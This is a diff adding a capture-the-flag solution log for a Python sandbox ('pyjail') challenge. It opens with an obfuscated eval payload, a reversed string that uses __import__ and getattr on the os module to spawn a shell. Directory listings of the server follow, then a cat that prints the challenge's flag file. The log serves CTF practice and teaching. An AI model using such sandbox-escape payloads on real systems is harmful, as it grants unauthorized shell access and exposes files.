@@ -1,0 +1,44 @@
+>> eval(')"hs"()]02-[))"so"(__tropmi__(rid,)"so"(__tropmi__(rttateg'[::-1])
+ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+ls /home
+NC
+overflow
+Pyjail
+Pyjail2
+Pyjail3
+python
+rpg_game
+sohard
+sysrop
+ls /home/Pyjail
+flag
+Pyjail.py
+cat /home/Pyjail/flag
+TRUST{pyja1l_1s_s0_h4rd_:(}
